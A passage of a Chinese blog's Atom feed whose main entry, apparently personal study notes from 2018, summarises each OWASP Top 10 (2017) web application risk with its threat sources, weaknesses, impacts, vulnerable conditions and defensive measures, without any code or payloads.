80</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="安全工具" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>OWASP TOP 10</title>
    <link href="http://yoursite.com/2018/08/13/OWASP10/"/>
    <id>http://yoursite.com/2018/08/13/OWASP10/</id>
    <published>2018-08-13T12:24:05.000Z</published>
    <updated>2018-08-14T01:14:25.851Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-56.png" alt="upload successful"></p><h1 id="什么是应用程序安全风险？"><a href="#什么是应用程序安全风险？" class="headerlink" title="什么是应用程序安全风险？"></a>什么是应用程序安全风险？</h1><p>攻击者可以通过应用程序中许多不同的路径方法去危害您的业务或者企业组织</p><p><img src="\images\pasted-55.png" alt="upload successful"></p><h1 id="A1注入"><a href="#A1注入" class="headerlink" title="A1注入"></a>A1注入</h1><h4 id="威胁来源"><a href="#威胁来源" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部Web服务。当攻击者可以向解释器发送恶意数据时，注入漏洞产生</p><h4 id="安全弱点"><a href="#安全弱点" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>注入漏洞十分普遍，尤其是在遗留代码中。注入漏洞通常能在SQL、 LDAP、 XPath或是NoSQL查询语句、 OS命令、 XML解析器、 SMTP包头、表达式语句及ORM查询语句中找到。</p><h4 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h4><p>注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管</p><h4 id="应用程序的脆弱性"><a href="#应用程序的脆弱性" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>当您的应用在如下时点时，是脆弱的并易受到攻击：</p><p>• 用户提供的数据没有经过应用程序的验证、过滤或净化。</p><p>• 动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。</p><p>• 在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。</p><p>• 恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语<br>句、命令或存储过程中包含结构和恶意数据。</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。<br>• 最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。</p><p>• 注意： 当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</p><p>• 使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。</p><p>• 对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。 OWASP的Java Encoder和类似的库提供了这样的转义例程</p><h1 id="A2失效的身份认证"><a href="#A2失效的身份认证" class="headerlink" title="A2失效的身份认证"></a>A2失效的身份认证</h1><h4 id="威胁来源-1"><a href="#威胁来源-1" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者可以获得数百万的有效用户名和密码组合，包括证书填充、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的GPU破解工具</p><h4 id="安全弱点-1"><a href="#安全弱点-1" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>大多数身份和访问管理系统的设计和实现，普遍存在身份认证失效问题。会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。攻击者可以使用指南手册来检测失效的身份验证，但通常会关注密码转储、字典攻击，或者在类似于钓鱼或社会工程攻击之后，发现失效的身份认证。</p><h4 id="影响-1"><a href="#影响-1" class="headerlink" title="影响"></a>影响</h4><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</p><h4 id="应用程序脆弱性"><a href="#应用程序脆弱性" class="headerlink" title="应用程序脆弱性"></a>应用程序脆弱性</h4><p>如果您的应用程序存在如下问题，那么可能存在身份验证的脆弱性：<br>• 允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</p><p>• 允许暴力破解或其他自动攻击。</p><p>• 允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin” 。</p><p>• 使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。</p><p>• 使用明文、加密或弱散列密码（参见： A3:2017-敏感数据泄露）。</p><p>• 缺少或失效的多因素身份验证。</p><p>• 暴露URL中的会话ID（例如URL重写）。</p><p>• 在成功登录后不会更新会话ID。</p><p>• 不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效</p><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>• 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</p><p>• 不要使用发送或部署默认的凭证，特别是管理员用户。</p><p>• 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。</p><p>• 将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</p><p>• 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</p><p>• 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</p><p>• 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</p><h1 id="A3敏感信息泄露"><a href="#A3敏感信息泄露" class="headerlink" title="A3敏感信息泄露"></a>A3敏感信息泄露</h1><h4 id="威胁来源-2"><a href="#威胁来源-2" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（例如：浏览器）窃取密钥、发起中间人攻击，或从服<br>务器端窃取明文数据。这通常需要手动攻击。通过使用图形处理单元（GPU），早前检索的密码数据库可能被暴力破解。</p><h4 id="安全弱点-2"><a href="#安全弱点-2" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>这是最常见的、最具影响力的攻击。 这个领域最常见的漏洞是不对敏感信息进行加密。在数据加密过程中，常见的问题是不安全的密钥生成和管理以及使用弱加密算法、弱协议和弱密码。特别是使用弱的哈希算法来保护密码。在服务器端，检测传输过程中的数据弱点很容易， 但检测存储数据的弱点却非常困难。</p><h4 id="应用程序的脆弱性-1"><a href="#应用程序的脆弱性-1" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>首先你需要确认的是哪些数据是敏感数据（包含：传输过程中的数据、存储数据）而需要被加密。例如：密码、信用卡卡号、医疗记录、个人信息应该被加密，特别是隐私法律或条例中规定需要加密的数据</p><p>对于这些数据，要确定：<br>• 在数据传输过程中是否使用明文传输？外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、 Web服务器或后端系统之间的通信。</p><p>• 当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据？</p><p>• 无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法？</p><p>• 是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转？</p><p>• 是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密？</p><h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><p>•对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</p><p> • 熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保 护敏感数据。 </p><p>• 对于没必要存放的、重要的敏感数据，应当尽快清除。未存储的数据不能被窃取。 </p><p>• 确保存储的所有敏感数据被加密。</p><p> • 确保使用了最新的、强大的标准算法或密码、参数、协议和密匙， 并且密钥管理到位。 </p><p>• 确保传输过程中的数据被加密，如：使用TLS。 确保数据加密被 强制执行，如：使用HTTP严格安全传输（HSTS ）。</p><p> • 禁止缓存对包含敏感数据的响应。 </p><p>• 确保使用密码专用算法存储密码    </p><h1 id="A4XML外部实体"><a href="#A4XML外部实体" class="headerlink" title="A4XML外部实体"></a>A4XML外部实体</h1><h4 id="威胁来源-3"><a href="#威胁来源-3" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者可以上传XML文档或者在XML文档中添加恶意内容，通过易受攻击的代码、依赖项或集成，他们就能够攻击含有缺陷的XML处理器。</p><h4 id="安全弱点-3"><a href="#安全弱点-3" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>默认情况下，许多旧的XML处理器能够对外部实体、XML进程中被引用和评估的URI进行规范。XXE漏洞测试在2017年并不常见，因此手动测试人员需要通过接受培训来了解如何进行XXE漏洞测试。</p><h4 id="影响-2"><a href="#影响-2" class="headerlink" title="影响"></a>影响</h4><p>XXE缺陷可用于提取数据、执行远程服务器请求、扫描内部系统、执行拒绝服务攻击和其他攻击。</p><h4 id="应用程序的脆弱性-2"><a href="#应用程序的脆弱性-2" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>应用程序和特别是基于XML的Web服务或向下集成，可能在以下方面容易受到攻击：<br>• 您的应用程序直接接受XML文件或者接受XML文件上传，特别是来自不受信任源的文件，或者将不受信任的数据插入XML文件，并提交给XML处理器解析。<br>• 在应用程序或基于Web服务的SOAP中，所有XML处理器都启用了文档类型定义（DTDs） </p><p>• 如果为了实现安全性或单点登录（SSO），您的应用程序使用SAML进行身份认证。而SAML使用XML进行身份确认，那么您的应用程序就容易受到XXE攻击</p><p>• 如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传递到SOAP框架，那么它可能受到XXE攻击。</p><p>• 存在XXE缺陷的应用程序更容易受到拒绝服务攻击</p><h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p>•尽可能使用简单的数据格式（如： JSON），避免对敏感数据进行序列化。</p><p>• 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。将SOAP更新到1.2版本或更高版本</p><p>• 在应用程序的所有XML解析器中禁用XML外部实体和DTD进程。</p><p>• 在服务器端实施积极的（“白名单”）输入验证、过滤和清理</p><p>• 验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证方法来验证上传的XML文件。</p><p>• SAST 工具可以检测源代码中的XXE漏洞</p><h1 id="A5失效的访问控制"><a href="#A5失效的访问控制" class="headerlink" title="A5失效的访问控制"></a>A5失效的访问控制</h1><h4 id="威胁来源-4"><a href="#威胁来源-4" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对访问控制的利用是渗透测试人员的一项核心技能。 SAST 工具和 DAST工具可以检测到访问控制的缺失，但不能验证其功能是否正常。访问控制可通过手动方式检测，或在某些特定框架下通过自动化检测访问控制缺失</p><h4 id="安全弱点-4"><a href="#安全弱点-4" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>由于缺乏自动化的检测和应用程序开发人员缺乏有效的功能测试，因而访问控制缺陷很常见。</p><h4 id="影响-3"><a href="#影响-3" class="headerlink" title="影响"></a>影响</h4><p>技术影响是攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、访问、更新或删除任何记录。业务影响取决于应用程序和数据的保护需求。</p><h4 id="应用程序的脆弱性-3"><a href="#应用程序的脆弱性-3" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>常见的访问控制脆弱点包括：<br>• 通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，或简单地使用自定义的 API 攻击工具</p><p>• 允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</p><p>• 特权提升。在不登录的情况下假扮用户，或以用户身份登录时充当管理员。</p><p>• 元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权限的cookie 或隐藏字段。</p><p>• CORS配置错误允许未授权的API访问。</p><p>• 以未通过身份验证的用户身份强制浏览的通过身份验证时才能看到的页面</p><h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><p>访问控制只有在受信服务器端代码或没有服务器的 API 中有效，这样这样攻击者才无法修改访问控制检查或元数据。<br>• 除公有资源外，默认情况下拒绝访问。</p><p>• 使用一次性的访问控制机制</p><p>• 建立访问控制模型以强制执行所有权记录，而不是接受用户创建、读取、更新或删除的任何记录。</p><p>• 域访问控制对每个应用程序都是唯一的，但业务限制要求应由域模型强制执行。</p><p>• 禁用 Web服务器目录列表，并确保文件元数据（如： git）不存在于 Web的根目录中。</p><p>• 记录失败的访问控制，并在适当时向管理员告警（如：重复故障）。</p><p>• 对API和控制器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害。</p><p>• 当用户注销后，服务器上的JWT令牌应失效。</p><h1 id="A6安全配置错误"><a href="#A6安全配置错误" class="headerlink" title="A6安全配置错误"></a>A6安全配置错误</h1><h4 id="威胁来源-5"><a href="#威胁来源-5" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者能够通过未修复的漏洞、访问默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权的访问或了解。</p><h4 id="安全弱点-5"><a href="#安全弱点-5" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>安全配置错误可以发生在一个应用程序堆栈的任何层面</p><h4 id="影响-4"><a href="#影响-4" class="headerlink" title="影响"></a>影响</h4><p>这些漏洞使攻击者能经常访问一些未授权的系统数据或功能。有时，这些漏洞导致系统的完全攻破。业务影响取决于您的应用程序和数据的保护需求。</p><h4 id="应用程序的脆弱性-4"><a href="#应用程序的脆弱性-4" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>您的应用程序可能受到攻击，如果应用程序是：<br>• 应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的权限配置错误。</p><p>• 应用程序启用或安装了不必要的功能（例如：不必要的端口、服务、网页、帐户或权限）。</p><p>• 默认帐户的密码仍然可用且没有更改。</p><p>• 错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</p><p>• 对于更新的系统，禁用或不安全地配置最新的安全功能。</p><p>• 应用程序服务器、应用程序框架（如： Struts、 Spring、ASP.NET）、库文件、数据库等没有进行安全配置。</p><p>• 服务器不发送安全标头或指令，或者未对服务器进行安全配置。</p><p>• 您的应用软件已过期或易受攻击（参见A9： 2017-使用含有已知漏洞的组件）。</p><h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><p>应实施安全的安装过程，包括：<br>• 一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。开发、质量保证和生产环境都应该进行相同配置，并且，在每个环境中使用不同的密码。</p><p>• 搭建最小化平台，移除或不安装不适用的功能和框架。</p><p>• 检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分</p><p>• 一个能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组。</p><p>• 向客户端发送安全指令，如： 安全标头。</p><p>• 在所有环境中能够进行正确安全配置和设置的自动化过程。</p><h1 id="A7跨站脚本XSS"><a href="#A7跨站脚本XSS" class="headerlink" title="A7跨站脚本XSS"></a>A7跨站脚本XSS</h1><h4 id="威胁来源-6"><a href="#威胁来源-6" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>自动化工具能够检测并利用所有的三种XSS形式，并且存在方便攻击者利用漏洞的框架。</p><h4 id="安全弱点-6"><a href="#安全弱点-6" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>XSS是OWASP Top10中第二普遍的安全问题，存在于近三分之二的应用中。自动化工具能自动发现一些XSS问题，特别是在一些成熟的技术中，如： PHP、 J2EE或JSP、 ASP.NET。</p><h4 id="影响-5"><a href="#影响-5" class="headerlink" title="影响"></a>影响</h4><p>XSS对于反射和DOM的影响是中等的，而对于存储的XSS， XSS的影响更为严重，譬如在受攻击者的<br>浏览器上执行远程代码，例如：窃取凭证和会话或传递恶意软件等。</p><h4 id="应用程序的脆弱性-5"><a href="#应用程序的脆弱性-5" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>存在三种XSS类型，通常针对用户的浏览器：<br>反射式XSS： 应用程序或API包括未经验证和未经转义的用户输入，作为HTML输出的一部分。</p><p>存储式XSS： 你的应用或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一般被认为是高危或严重的风险。</p><p>基于DOM的XSS： 会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞</p><p>典型的XSS攻击可导致盗取session、账户、绕过MFA、 DIV替换、对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其他用户的攻击。</p><h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><p>防止XSS需要将不可信数据与动态的浏览器内容区分开。 这可以通过如下步骤实现：</p><p>• 使用设计上就会自动编码来解决XSS问题的框架，如： Ruby 3.0</p><p>• 为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML输出的上下文（包括：主体、属性、 JavaScript、 CSS或URL）对所有不可信的HTTP请求数据进行恰当的转义 。 </p><p>• 在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的选择是实施上下文敏感数据编码。 </p><p>• 使用内容安全策略（CSP） 是对抗XSS的深度防御策略。</p><h1 id="A8不安全的反序列化"><a href="#A8不安全的反序列化" class="headerlink" title="A8不安全的反序列化"></a>A8不安全的反序列化</h1><h4 id="威胁来源-7"><a href="#威胁来源-7" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对反序列化的利用是有点困难的。因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难<br>被使用。</p><h4 id="安全弱点-7"><a href="#安全弱点-7" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>有些工具可以被用于发现反序列化缺陷，但经常需要人工帮助来验证发现的问题。</p><h4 id="影响-6"><a href="#影响-6" class="headerlink" title="影响"></a>影响</h4><p>反序列化缺陷的影响不能被低估。它们可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</p><h4 id="应用程序的脆弱性-6"><a href="#应用程序的脆弱性-6" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>如果反序列化进攻者提供的敌意或者篡改过的对象将会使将应用程序和API变的脆弱。<br>这可能导致两种主要类型的攻击：<br>• 如果应用中存在可以在反序列化过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。</p><p>• 典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</p><h4 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体。<br>如果上述不可能的话，考虑使用下述方法：</p><p>• 执行完整性检查，如：任何序列化对象的数字签名，以防止恶意对象创建或数据篡改。</p><p>• 在创建对象之前强制执行严格的类型约束，因为代码通常被期望成一组可定义的类。绕过这种技术的方法已经被证明，所以完全依赖于它是不可取的。</p><p>• 如果可能，隔离运行那些在低特权环境中反序列化的代码。</p><p>• 记录反序列化的例外情况和失败信息</p><p>• 限制或监视来自于容器或服务器传入和传出的反序列化网络连接。</p><h1 id="A9使用含有已知漏洞的组件"><a href="#A9使用含有已知漏洞的组件" class="headerlink" title="A9使用含有已知漏洞的组件"></a>A9使用含有已知漏洞的组件</h1><h4 id="威胁来源-8"><a href="#威胁来源-8" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>对一些漏洞很容易找到其利用程序</p><h4 id="安全弱点-8"><a href="#安全弱点-8" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>这种安全漏洞普遍存在。基于组件开发的模式使得多数开发团队根本不了解其应用或API中使用的组件，更谈不上及时更新这些组件了。</p><h4 id="影响-7"><a href="#影响-7" class="headerlink" title="影响"></a>影响</h4><p>虽然对于一些已知的漏洞其影响很小，但目前很多严重的安全事件都是利用组件中的已知漏洞。根据你所要保护的资产，此类风险等级可能会很高。</p><h4 id="应用程序的脆弱性-7"><a href="#应用程序的脆弱性-7" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p>如果满足下面的某个条件，那么你的应用就易受此类攻击：<br>• 如果你不知道所有使用的组件版本信息</p><p>• 如果软件易受攻击，不再支持或者过时。这包括： OS、 Web服务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、API和所有的组件、运行环境和库。</p><p>• 如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</p><p>• 如果你不基于风险并及时修复或升级底层平台、框架和依赖库。</p><p>• 如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼容性测试。</p><p>• 如果你没有对组件进行安全配置</p><h4 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4><p>应该制定一个补丁管理流程：<br>• 移除不使用的依赖、不需要的功能、组件、文件和文档。</p><p>• 利用如 versions、 DependencyCheck 、 retire.js等工具来持续的记录客户端和服务器端以及它们的依赖库的版本信息，订阅关于使用组件安全漏洞的警告邮件。</p><p>• 仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险</p><p>• 监控那些不再维护或者不发布安全补丁的库和组件。</p><h1 id="A10不足的日志记录和监控"><a href="#A10不足的日志记录和监控" class="headerlink" title="A10不足的日志记录和监控"></a>A10不足的日志记录和监控</h1><h4 id="威胁来源-9"><a href="#威胁来源-9" class="headerlink" title="威胁来源"></a>威胁来源</h4><p>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。</p><h4 id="安全弱点-9"><a href="#安全弱点-9" class="headerlink" title="安全弱点"></a>安全弱点</h4><p>判断你是否有足够监控的一个策略是在渗透测试后检查日志。 测试者的活动应被充分的记录下来，能够反映出他们造成了什么样的影响。</p><h4 id="影响-8"><a href="#影响-8" class="headerlink" title="影响"></a>影响</h4><p>多数成功的攻击往往从漏洞探测开始。允许这种探测会将攻击成功的可能性提高到近100%</p><h4 id="应用程序的脆弱性-8"><a href="#应用程序的脆弱性-8" class="headerlink" title="应用程序的脆弱性"></a>应用程序的脆弱性</h4><p> 下列情况会导致不足的日志记录、检测、监控和响应：<br>• 未记录可审计性事件，如：登录、登录失败和高额交易。</p><p>• 告警和错误事件未能产生或产生不足的和不清晰的日志信息。</p><p>• 没有利用应用系统和API的日志信息来监控可疑活动。</p><p>• 日志信息仅在本地存储。</p><p>• 没有定义合理的告警阈值和制定响应处理流程。</p><p>• 渗透测试和使用DAST工具（如： OWASP ZAP）扫描没有触发告警</p><p>• 对于实时或准实时的攻击，应用程序无法检测、处理和告警</p><h4 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h4><p>根据应用程序存储或处理的数据的风险：<br>• 确保所有登录、访问控制失败、输入验证失败能够被记录到日志中去，并保留足够的用户上下文信息，以识别可疑或恶意帐户，并为后期取证预留足够时间。</p><p>• 确保日志以一种能被集中日志管理解决方案使用的形式生成</p><p>• 确保高额交易有完整性控制的审计信息，以防止篡改或删除</p><p>• 建立有效的监控和告警机制，使可疑活动在可接受的时间内被发现和应对。</p><p>• 建立或采取一个应急响应机制和恢复计划</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
